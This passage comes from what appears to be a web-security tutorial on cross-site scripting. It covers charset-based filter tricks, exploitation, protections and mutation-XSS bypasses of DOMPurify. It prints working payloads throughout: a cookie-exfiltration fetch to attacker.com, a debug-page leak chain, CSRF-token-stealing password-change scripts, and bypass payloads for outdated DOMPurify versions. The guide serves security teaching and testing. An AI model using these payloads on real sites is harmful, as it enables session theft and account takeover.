The detection mechanism also differs per browser. In Chrome, you just need to convince the detection by having enough escape sequences, [as noticed experimentally](https://x.com/J0R1AN/status/1871586792455163975). Firefox is more logical in that the decoded string needs to all be valid mapped characters. Most are, but some byte combinations in ASCII turn into invalid unicode in the 2-wide charset variations. That means you must be careful with which characters you choose, but sometimes shifting the length by 1 can push them into the mapped territory again by chance.

For example, the following vector which would bypass DOMPurify without any attributes:

{% code title="Chrome only" %}
```html
\x1b$B<style>\x1b(B<\x1b(Bimg src=x onerror=alert(origin)></style>
```
{% endcode %}

While [it works on Chrome](https://r.jtw.sh/poc.html?body=%1B%24B%3Cstyle%3E%1B%28B%3C%1B%28Bimg+src%3Dx+onerror%3Dalert%28origin%29%3E%3C%2Fstyle%3E), it does _not_ on Firefox. The reason for this, is that if we decode it, `�` characters appear. We need to alter the payload in such a way that everything in the output has a valid codepoint instead of this replacement character.

```javascript
d = new TextDecoder("ISO-2022-JP");
e = new TextEncoder("UTF-8");
s = `\x1b$B<style>\x1b(B<\x1b(Bimg src=x onerror=alert(origin)></style>`;
console.log(d.decode(e.encode(s)));
// '首�跂�<img src=x onerror=alert(origin)></style>'
```

The 2-wide charset region starts from `\x1b$B` and ends at `\x1b(B`. The bytes are divided as `<s` `ty` `le` `>`, of which both `ty` and `>` don't map to valid characters in _JIS X 0201 1978_. But, we can simply put an `a` in front it to create chunks like `a<` `st` `yl` `e>`, which all happen to be valid characters! A [working payload for Firefox](https://r.jtw.sh/poc.html?body=%1B%24Ba%3Cstyle%3E%1B%28B%3C%1B%28Bimg+src%3Dx+onerror%3Dalert%28origin%29%3E%3C%2Fstyle%3E) would thus be:

{% code title="Working on Firefox" %}
```html
\x1b$Ba<style>\x1b(B<\x1b(Bimg src=x onerror=alert(origin)></style>
```
{% endcode %}

For a searchable list of all characters that do and don't work, see [this gist](https://gist.github.com/JorianWoltjer/7faca2472e8835ba6b493f1a00880bd6).

## Exploitation

Making an `alert()` pop up is cool, but to show the impact it might be necessary to exploit what an XSS or JavaScript execution gives you. The summary is that you can do almost everything a user can do themselves, but do this for them. You can click buttons, request pages, post data, etc. which open up a large field of impact, depending on what an application lets the user do.&#x20;

### From another site

The _Cross-Site_ in XSS means that it should be exploitable from another malicious site, which can then perform actions on the victim's behalf on the target site. It is always a good idea to test exploits locally first with a simple web server like `php -S 0.0.0.0:8000`, and when you need to exploit something remotely it can be hosted temporarily with a tool like [ngrok](https://ngrok.com/), or permanently with a web server of your own.&#x20;

The easiest is **Reflected XSS**, which should trigger when a specific URL is triggered. If someone visits your page, you can simply redirect them to the malicious URL with any payload to trigger the XSS:

{% code title="Example attacker page" %}
```html
<script>
    location = "https://target.com/endpoint?xss=<style onload=alert()>"
</script>
```
{% endcode %}

{% hint style="info" %}
Note that [URL Encoding](https://gchq.github.io/CyberChef/#recipe=URL_Encode\(true\)\&input=PHN0eWxlIG9ubG9hZD1hbGVydCgpPg) might be needed on parameters to make sure special characters are not part of the URL, or to simply obfuscate the payload
{% endhint %}

For **Stored XSS**, a more likely scenario might be someone else stumbling upon the payload by using the site normally, but if the location is known by the attacker they can also redirect a victim to it in the same way as Reflected XSS as shown above.&#x20;

Some exploits require more complex interaction between the attacker and the target site, like `<iframe>`'ing (only if [#content-security-policy-csp](./#content-security-policy-csp "mention") and `X-Frame-Options` allows) or opening windows (only when handling user interaction like pressing a button with `onclick=`).&#x20;

### Stealing Cookies

In the early days of XSS, this was often the target vector for exploitation, as session cookies could be stolen and exfiltrated to an attacker to later impersonate them on demand. This is done with the `document.cookie` variable that contains all cookies as a string. Then using `fetch()` a request containing this data can be made to the attacker's server to read remotely:

```javascript
fetch("http://attacker.com/leak?cookie=" + document.cookie)
```

Pretty often, however, modern frameworks will set the `httpOnly` flag on cookies which means they will **not** be available for JavaScript, only when making HTTP requests. This `document.cookie` variable will simply not contain the cookie that the flag is on, meaning it cannot be exfiltrated directly. But the possibilities do not end here, as you can still **make requests** using the cookies from within JavaScript, just not directly read them.&#x20;

{% hint style="warning" %}
In very restricted scenarios you might not be able to make an outbound connection due to the `connect-src` [#content-security-policy-csp](./#content-security-policy-csp "mention") directive. See that chapter for ideas on how to still exfiltrate data
{% endhint %}

### Forcing requests - `fetch()`

When making a `fetch()` request to the same domain you are on, cookies are _included_, even if `httpOnly` is set. This opens up many possibilities by requesting data and performing actions on the application. When making a request, the response is also readable because of the [Same-Origin Policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy), as we are on the same site as the request is going to.

One idea to still steal cookies would be to request a page that responds with the cookie information in some way, like a debug or error page. You can then request this via JavaScript `fetch()` and exfiltrate the response:

{% code title="Payload" %}
```javascript
fetch("http://target.com/debug")  // Perform request
    .then(res => res.text())      // Read response as text
    .then(res => fetch("http://attacker.com/leak?" + res));
```
{% endcode %}

{% code title="Logs of attacker.com" %}
```log
"GET /leak?session=... HTTP/1.1" 404 -
```
{% endcode %}

{% hint style="info" %}
**Tip**: For more complex data, you can use `btoa(res)` to Base64 encode the data which makes sure no special characters are included, which you can later decode
{% endhint %}

A more common way of exploitation is by requesting personal data from a settings page or API route, which works in a very similar way as shown above.

#### Performing actions

Performing actions on the victim's behalf can is also common and can result in a high impact, depending on their capabilities. These are often done using POST requests and may contain extra data or special headers. Luckily, [`fetch()`](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch) allows us to do all that and more! Its second argument contains `options` with keys like `method:`, `headers:`, and `body:` just to name a few:

{% code title="Payload" %}
```javascript
fetch("http://target.com/api/change_password", {
    method: "POST",
    headers: {
        "Content-Type": "application/json",
        "X-Custom-Header": "anything"
    },
    body: JSON.stringify({
        "password": "hacked",
        "confirm_password": "hacked"
    })
})
```
{% endcode %}

{% code title="HTTP Request" %}
```http
POST /api/change_password HTTP/1.1
Host: target.com
Cookie: session=...
X-Custom-Header: anything
Content-Type: application/json
Content-Length: 49

{"password":"hacked","confirm_password":"hacked"}
```
{% endcode %}

Due to `fetch()` only being a simple function call, you can create a very complex sequence of actions in JavaScript code to execute on the victim, as some actions require some setup. You could create an API token using one request, and then use it in the next to perform some API call. Or a more common example is fetching a [cross-site-request-forgery-csrf.md](../cross-site-request-forgery-csrf.md "mention") token from some form, and then using that token to POST data if it is protected in that way. As you can see, CSRF tokens do _not_ protect against XSS:

```javascript
fetch("http://target.com/login")  // Request to some form with CSRF token
    .then(res => res.text())
    .then(res => {
        // Extract CSRF token
        const csrf_token = res.match(/<input type="hidden" name="csrf_token" value="(.*)" \/>/)[1];
        // Build password reset form data
        const form = new FormData();
        form.append("csrf_token", csrf_token);
        form.append("password", "hacked");
        form.append("confirm_password", "hacked");

        // Perform another request with leaked token
        fetch("http://target.com/change_password", {
            method: "POST",
            body: form
        });
    });
```

{% hint style="info" %}
**Tip**: If there is no CSRF token, you may also be able to send `SameSite=Strict` cookies from another subdomain that you have XSS on to a target, because the are considered same-site. Read more about this in [cross-site-request-forgery-csrf.md](../cross-site-request-forgery-csrf.md "mention").
{% endhint %}

### HTML Injection

With JavaScript execution, you can also perform all tricks explained in the page below. With impact like leaking the current URL, content on the page, or phishing password managers:

{% content-ref url="html-injection.md" %}
[html-injection.md](html-injection.md)
{% endcontent-ref %}

Some of the mentioned phishing tricks can be improved with XSS by rewriting the URL shown in the address bar. This is possible with the [History API](https://developer.mozilla.org/en-US/docs/Web/API/History_API), to show the user an expected `/login` or something:

```javascript
history.replaceState(null, null, "/login");
```

## Protections

XSS is a well-known issue, and many protections try to limit its possibility on websites. There are basically two cases a website needs to handle when reflecting a user's content:

1. Content, but **no HTML** is allowed (almost all data)
2. **Limited HTML tags** are allowed (rich text like editors)

The **1st** is very easily protected by using HTML Encoding. Many frameworks already do this by default, and explicitly have you write some extra code to turn it off. Most often this encodes only the special characters like `<` to `&lt;`, `>` to `&gt;`, and `"` to `&quot;`. While this type of protection is completely safe in most cases, some situations exist where these specific characters are _not required_ to achieve XSS. We've seen examples of [#attribute-injection](./#attribute-injection "mention") where a `'` single quote is used instead, which may not be encoded and thus can be escaped. Or when your attribute is not enclosed at all and a simple   space character can add another malicious attribute. With [#script-injection](./#script-injection "mention") this is a similar story, as well as [#dom-xss](./#dom-xss "mention").&#x20;

The **2nd** case is _very hard_ to protect securely. First, because many tags have unexpected abilities, like the `<a href=javascript:alert()>` protocol. If posting links is allowed, they need to think about preventing the `javascript:` protocol specifically and allowing regular `https://` links. There exist a ton of different tags and attributes that can execute JavaScript (see the [Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)) making a blocklist almost infeasible, and an allowlist should be used. \
The second reason this is hard is because browsers are _weird_, like _really weird_. The [HTML Specification](https://html.spec.whatwg.org/) contains a lot of rules and edge cases a filter should handle. If a filter parses a specially crafted payload differently from a browser, the malicious data might go unnoticed and end up executing in the victim's browser.&#x20;

One common protection is a `Content-Security-Policy:` response header, which can protect against various client-side attacks by restricting what researches may be "trusted" and executed:

{% content-ref url="content-security-policy-csp.md" %}
[content-security-policy-csp.md](content-security-policy-csp.md)
{% endcontent-ref %}

### Filter Bypasses

Some of the most useful and common filter bypasses are shown in [#common-filter-bypasses](./#common-filter-bypasses "mention").

If a server is checking your input for suspicious strings, they will have a hard time as there are many ways to obfuscate your payloads. Even a simple `<a href=...>` tag has many places where the browser allows special and unexpected characters, which may break the pattern the server is trying to search for. Here is a clear diagram showing _where_ you can insert _what_ characters:

<figure><img src="../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption><p>XSS mutation points with possible special characters (<a href="https://twitter.com/hackerscrolls/status/1273254212546281473?s=21">source</a>)</p></figcaption></figure>

The XSS Cheat Sheet by PortSwigger has an extremely comprehensive list of all possible tags, attributes, and browsers that allow JavaScript execution, with varying levels of user interaction:

{% embed url="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" %}
Filterable list of almost every imaginable HTML that can trigger JavaScript
{% endembed %}

You can use the above list to filter certain tags you know are allowed/blocked, and copy all payloads for fuzzing using a tool to find what gets through a filter.

The _Shazzer_ tool is useful for finding fuzzing examples other people have already made, and creating your own ones without worrying about how to iterate through your options. Simply provide a template and an insertion point, and let it try a bunch of variations:

{% embed url="https://shazzer.co.uk/" %}
Easy to use JavaScript/HTML fuzzing tool with shared results
{% endembed %}

#### JavaScript payload

In case you are able to inject JavaScript correctly but are unable to exploit it due to the filter blocking your JavaScript payload, there are many tricks to still achieve code execution. One of them is using the `location` variable, which can be assigned to a `javascript:` URL just like in DOM XSS, but this is now a very simple function call trigger as we don't need parentheses or backticks, as we can escape them in a string like `\x28` and `\x29`.&#x20;

```
location="javascript:alert\x28\x29"
```

{% embed url="https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md" %}
More tricks to run arbitrary JavaScript without paratheses to bypass filters
{% endembed %}

In fact, we can even go one step further and use the global `name` variable which is controllable by an attacker. So global, that it **persists between navigations**. When a victim visits our site like in an XSS scenario, we can set the `name` variable to any payload we like and redirect to the vulnerable page to trigger it (see [this video](https://www.youtube.com/watch?v=3zShGLEqDn8) for more info and explanation):

{% code title="JavaScript Payload" %}
```javascript
location=name
```
{% endcode %}

<pre class="language-html" data-title="Attacker&#x27;s page"><code class="lang-html">&#x3C;script>
<strong>  name = "javascript:alert()";
</strong><strong>  window.open("https://target.com/?xss=location%3Dname", "_self");
</strong>  // use of "_self" doesn't require interaction, and works on Firefox
&#x3C;/script>
</code></pre>

### Mutation XSS & DOMPurify

Mutation XSS is a special kind of XSS payload where you are **abusing a difference in the checking environment vs. the destination environment**. There are some special browser rules for when HTML finds itself in certain tags, that are different from inside other tags. This difference can sometimes be abused to create a benign payload in the checking context but will be mutated by the browser in a different context into a malicious payload.

I myself went into detail on this technique in late 2024, and explain the ideas in detail in the blog post below, together with some new tricks:

{% embed url="https://jorianwoltjer.com/blog/p/hacking/mutation-xss" %}
Explanation of mXSS, CVE-2024-52595 and some advanced techniques
{% endembed %}

Let's take the following example: The [DOMPurify](https://github.com/cure53/DOMPurify) sanitizer is used to filter out malicious content that could trigger JavaScript execution, which it does perfectly on the following string:

{% code title="DOMPurify" %}
```html
<p id="</title><img src=x onerror=alert()>"></p>
```
{% endcode %}

There is a `<p>` tag with `"</title><img src=x onerror=alert()>"` as its `id=` attribute, nothing more, and nothing that would trigger JavaScript surely. But then comes along the browser, which sees this payload placed into the DOM, inside the existing `<title>` tag:

<pre class="language-html" data-title="Browser DOM"><code class="lang-html">&#x3C;title>
<strong>    &#x3C;p id="&#x3C;/title>&#x3C;img src=x onerror=alert()>">&#x3C;/p>
</strong>&#x3C;/title>
</code></pre>

Perhaps surprisingly, it is **parsed differently** now that it is inside of the `<title>` tag. Instead of a simple `<p>` tag with an `id=` attribute, this turned into the following after mutation:

{% code title="Browser DOM after mutation" %}
```html
<html><head><title>
    &lt;p id="</title></head><body><img src="x" onerror="alert()">"&gt;<p></p>
</body></html>
```
{% endcode %}

See what happened here? It suddenly closed with the `</title>` tag and started an `<img>` tag with the malicious `onerror=` attribute, executing JavaScript, and causing XSS! This means in the following example, `alert(1)` fires but `alert(2)` does not:

<pre class="language-html" data-title="Demo"><code class="lang-html">&#x3C;title>
<strong>    &#x3C;p id="&#x3C;/title>&#x3C;img src=x onerror=alert(1)>">&#x3C;/p>
</strong>&#x3C;/title>
<strong>&#x3C;p id="&#x3C;/title>&#x3C;img src=x onerror=alert(2)>">&#x3C;/p>
</strong></code></pre>

DOMPurify does not know of the `<title>` tag the application puts it in later, so it can only say if the HTML is safe on its own. In this case, it is, so we bypass the check through Mutation XSS.&#x20;

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Example from <a href="https://mizu.re/post/intigriti-october-2023-xss-challenge">mizu.re's writeup</a> showing the difference between the browser and DOMPurify</p></figcaption></figure>

A quick for-loop later we can find that this same syntax works for all these tags:\
`iframe`, `noembed`, `noframes`, `noscript`, `script`, `style`, `textarea`, `title`, `xmp`

These types of Mutation XSS tricks are highly useful in bypassing simpler sanitizer parsers because DOMPurify had to really put in some effort to get this far. Writing payloads that put the real XSS in an attribute and use mutation to escape out of it can be unexpected and the developers may not have thought about the possibility, and only use some regexes or naive parsing.

Where this gets really powerful is using HTML encoding if the sanitizer parses the payload, and then reassembles the HTML afterward, for example:

<pre class="language-html"><code class="lang-html"><strong>&#x3C;title>&#x3C;p id="&#x26;lt;&#x26;sol;title&#x26;gt;&#x26;lt;img src&#x26;equals;x onerror&#x26;equals;alert&#x26;lpar;&#x26;rpar;&#x26;gt;">&#x3C;/p>&#x3C;/title>
</strong>&#x3C;!-- could be serialized back into this Mutation XSS -->
&#x3C;title>&#x3C;p id="&#x3C;/title>&#x3C;img src=x onerror=alert()>">&#x3C;/p>&#x3C;/title>
</code></pre>

***

[@kevin\_mizu](https://twitter.com/kevin_mizu/status/1735984327274688630) showed another interesting exploitable scenario, where your input is placed inside an `<svg>` tag after sanitization:

<pre class="language-html"><code class="lang-html">&#x3C;svg>
<strong>    a&#x3C;style>&#x3C;!--&#x3C;/style>&#x3C;a id="--!>&#x3C;img src=x onerror=alert()>">&#x3C;/a>
</strong>&#x3C;/svg>
</code></pre>

This is another DOMPurify "bypass" with a more common threat, all a developer needs to do is put your payload inside of an `<svg>` tag, without sanitizing it with the `<svg>` tag. This payload is a bit more complicated as you'll see, but **here's a breakdown**:\
The trick is the difference between SVG parsing and HTML parsing. _In HTML_ which DOMPurify sees, the `<style>` tag is special as it switches the parsing context to CSS, which doesn't support comments like `<!--` and it won't be interpreted as such. Therefore the `</style>` closes it and the `<a id="...">` opens another innocent tag and attribute. DOMPurify doesn't notify anything wrong here and won't alter the input. \
&#xNAN;_&#x49;n SVG,_ however, the `<style>` tag doesn't exist and it is interpreted as any other invalid tag in XML. The children inside might be more tags, a `<!--` comment in this case. This only ends at the start of the `<a id="--!>` attribute and that means after the comment comes more raw HTML. Then our `<img onerror=>` tag is read for real and the JavaScript is executed!

{% hint style="info" %}
**Tip**: Instead of a comment, another possibility is using the special `<![CDATA[` ... `]]` syntax in SVGs that abuses a similar parsing difference:

<pre class="language-html"><code class="lang-html">&#x3C;svg>
<strong>    a&#x3C;style>&#x3C;![CDATA[&#x3C;/style>&#x3C;a id="]]>&#x3C;img src=x onerror=alert()>">&#x3C;/a>
</strong>&#x3C;/svg>
</code></pre>
{% endhint %}

#### DOMPurify outdated versions

While the abovementioned tricks can get around specific situations, an _outdated version_ of the [`dompurify`](https://www.npmjs.com/package/dompurify) library can cause every output to be vulnerable by completely bypassing DOMPurify in a regular context. The **latest vulnerable version is 3.1.2**, with the following two articles explaining in detail how the recent techniques work:

{% embed url="https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes" %}
Bypasses of versions 3.1.0-3.1.2 using node flattening (credits to [@IcesFont](https://x.com/IcesFont2))
{% endembed %}

{% embed url="https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations" %}
Common misconfigurations in various later versions
{% endembed %}

The latest vulnerable default version that doesn't use deep nesting is 2.2.3 by [@TheGrandPew](https://twitter.com/TheGrandPew) in _dec. 2020_. The following payload will trigger `alert(origin)` when sanitized and put into any regular part of the DOM:

{% code title="DOMPurify 2.2.3 Bypass" overflow="wrap" %}
```html
<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><style><a title="</style><img src onerror=alert(origin)>">
```
{% endcode %}

All versions <= 2.5.2 or <= 3.1.2 are vulnerable by default, here's the payload for **3.1.0** (see the above writeups for variations on later versions):

{% code title="DOMPurify 3.1.0 Bypass" %}
```html
<div*506>
<table>
  <caption>
    <svg>
      <title>
        <table><caption></caption></table>
      </title>
      <style><a id="</style><img src=x onerror=alert(origin)>"></a></style>
    </svg>
  </caption>
</table>
```
{% endcode %}

{% code title="Copyable" %}
```html
<div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><table><caption><svg><title><table><caption></caption></table></title><style><a id="</style><img src=x onerror=alert(origin)>"></a></style></svg></caption></table>html
```
{% endcode %}

{% hint style="info" %}
**Earlier Proof of Concepts**:

[**<= 3.1.2** - Kevin Mizu & RyotaK](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes#proof-of-concept-3)\
[**<= 3.1.1** - Kevin Mizu](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes#proof-of-concept-2)\
[**<= 3.1.0** - IcesFont](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes#proof-of-concept-1)

[**< 2.2.4** - TheGrandPew](https://twitter.com/TheGrandPew/status/1338773976034598917)\
[**< 2.2.3** - TheGrandPew](https://twitter.com/TheGrandPew/status/1336901666285604866)\
[**< 2.2.2** - Daniel Santos](https://vovohelo.medium.com/from-svg-and-back-yet-another-mutation-xss-via-namespace-confusion-for-dompurify-2-2-2-bypass-5d9ae8b1878f)\
[**< 2.1** - Gareth Heyes](https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss)\
[**< 2.0.17** - Michał Bentkowski](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/)
{% endhint %}

For the latest news and configuration-dependent bypasses, check out the changelog:

{% embed url="https://github.com/cure53/DOMPurify/releases" %}
Changelog of DOMPurify mentioning partial bypasses on specific versions
{% endembed %}

Also checkout this tool to identify unique features about different HTML sanitizers/parsers. You need to implement the logic for inputting and reading output HTML, then this tool will do the rest:

{% embed url="https://github.com/Slonser/hui" %}
Identify HTML sanitizers and parsers interactively
{% endembed %}

#### Server-Side parser differentials

Parsing HTML is hard, and if you're sanitizing content on the server before sending it to the client, there are often tiny differences in how the server vs. client sees the content.

One [example from DOMPurify](https://github.com/cure53/DOMPurify?tab=readme-ov-file#running-dompurify-on-the-server) is the **JSDOM** dependency which needs to be up to date to be accurate. Version **19.0.0**, for example, would parse the following HTML wrongly ([source](https://www.ias.cs.tu-bs.de/publications/parsing_differentials.pdf)):

```html
<svg><style>&lt;img src=x onerror=alert(origin)&gt;<keygen>
```

Another example is the pattern where a library like [`parse5`](https://www.npmjs.com/package/parse5) serializes the inner content all children, but assumes these are all in the HTML namespace. If you inject a `<math>` tag in the root, it will parse as MathML to the server but then serialize the HTML without that context. This causes the browser to see it as regular HTML and turn into a namespace confusion exploitable using `<style>`:

```javascript
import * as parse5 from 'parse5';

function parse(text) {
    const fragment = parse5.parseFragment(`<div>${text}</div>`);
    // Imagine sanitization here
    console.log(fragment.childNodes[1].childNodes[0].childNodes[0]);
    // {nodeName: '#comment', data: '</style><img src onerror=alert()></div>'}
    return fragment.childNodes.map(node => parse5.serialize(node)).join('');
}

console.log(parse("</div><math><style><!--</style><img src onerror=alert()>"));
```

During parsing it is correctly seen as the MathML namespace and the `<!--` comment syntax prevents the style tag from closing. The payload is seen as a _comment_.\
The result in the browser omits the `<div>` and `<math>` root-level tags, causing the XML comment not to be recognized and the `</style>` actually closes it, bringing the context back from CSS to HTML.

<figure><img src="../../../.gitbook/assets/image (80).png" alt=""><figcaption><p>Parsed result of sanitization in the browser, executing payload</p></figcaption></figure>

#### Resources

* Easy-to-follow Google Search mXSS: [https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/](https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/)
* Finding a custom variation of an outdated DOMPurify bypass specific to **Swagger UI**: [https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers](https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/#let%E2%80%99s-find-a-custom-variation-of-the-bypass)
  * _note_: for unique versions below 3 (2.X.X), you don't need mXSS:\
    [https://gist.github.com/JorianWoltjer/33e28f871652ac9e97086148ed965b54](https://gist.github.com/JorianWoltjer/33e28f871652ac9e97086148ed965b54)
* More complex Universal mXSS: [https://twitter.com/garethheyes/status/1723047393279586682](https://twitter.com/garethheyes/status/1723047393279586682)

For more tricks and finding your own custom vectors, check out the following cheatsheet and tool:

{% embed url="https://sonarsource.github.io/mxss-cheatsheet/" %}
Mutation XSS **cheatsheet** containing many unique element behaviors useful for bypassing filters
{% endembed %}

{% embed url="https://yeswehack.github.io/Dom-Explorer/dom-explorer/" %}
Test HTML parsing/sanitization with great visualization and sharing capabilities
{% endembed %}

[^1]: slashes (/) and quotes (") disallowed

[^2]: quotes (") disallowed
